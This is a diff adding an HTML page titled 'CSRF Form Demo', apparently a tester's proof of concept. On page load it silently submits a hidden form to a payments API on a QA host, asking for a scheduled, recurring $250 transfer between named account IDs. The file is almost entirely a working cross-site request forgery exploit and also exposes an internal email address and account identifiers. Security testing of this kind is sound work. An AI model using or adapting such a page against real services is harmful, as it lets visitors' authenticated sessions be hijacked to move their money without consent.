@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Form Demo</title>
+</head>
+<body>
+  <h3>CSRF Demo: auto‑submitting NOW...</h3>
+
+  <form id="csrfForm"
+        action="https://api.qa.veem.com/api/payments/businesstxn/accounts/354411/businesstxn?extraData=fundingMethod&extraData=cancellableFlag&extraData=PAYMENT_ATTRIBUTES&transactionType=Payment"
+        method="POST"
+        enctype="application/x-www-form-urlencoded">
+    <!-- 
+      We break the JSON into a single URL‑encoded key called "payload".
+      Your server must accept something like: payload={…JSON…} 
+      and parse it server‑side as JSON. 
+      (Some APIs are configured to auto‑deserialize URL‑encoded JSON.)
+    -->
+    <input type="hidden" name="payload" value='{"payment":{"payerAccountId":"354411","payeeAccountId":"378694","amount":{"number":"250","currency":"USD"},"paymentExtraInfo":{"purposeOfPayment":"Personal","purposeOfPaymentDescription":"Serviços Teste","preset":{"payee":{"accountId":"378694","business":{"address":{"accountId":"378694","city":"Cape Town","countryCode":"US","id":"234945","stateProvince":"AZ"},"entity":"Contractor","businessOwnership":{"onboardingIsFullOwner":null},"phoneNumber":"*********8137","countryDialCode":"***","isContractor":true,"industry":"Holding Companies & Conglomerates","subIndustry":"Holding Companies & Conglomerates"},"email":"adeel.akram+achtoibtreceiver@veem.com"},"payer":{"accountId":"379503"},"requestingPayment":false,"liteInvoice":false,"schedule":true,"recurrence":true,"initiatorSideEntered":"payer","initiatorPayeeCurrencyCodeEntered":"USD","initiatorPayeeAmount":250},"isPayMeLinkPayment":false,"isPayerCoveringACHFee":true,"promoCode":""},"attributes":[{"type":"IS_FASTER_ACH","value":false},{"type":"PAYMENT_SPEED_TYPE","value":"TRUE_GOOD_FUNDS"},{"type":"IS_RTP_PAYMENT","value":false}],"payerFundingMethodId":"171174","payerFundingMethodType":"Bank","externalPaymentLinked":false,"setDefaultPurposeOfPaymentForPayeeContact":true}}'/>
+  </form>
+
+  <script>
+    // Auto‑submit the form when the page loads.
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
